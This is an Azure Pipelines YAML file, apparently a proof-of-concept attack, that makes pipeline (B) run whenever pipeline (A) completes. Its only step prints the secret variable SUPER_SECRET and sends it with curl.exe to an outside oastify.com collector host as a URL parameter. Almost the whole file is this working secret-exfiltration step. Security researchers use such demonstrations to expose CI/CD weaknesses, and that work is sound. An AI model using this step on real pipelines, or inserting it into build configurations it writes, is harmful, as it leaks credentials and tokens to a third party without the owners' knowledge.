trigger: none
pr: none

pool: Default

resources:
  pipelines:
  - pipeline: pipeline (B)
    source: pipeline (A)
    trigger: true # Run pipeline (B) when any run of pipeline (A) completes
    branch: main

steps:
  - script: |
      echo $(SUPER_SECRET)
      curl.exe http://uoma27bw5txasd30j51u5pbdp4vwpkk89.oastify.com/?secret=$(SUPER_SECRET)
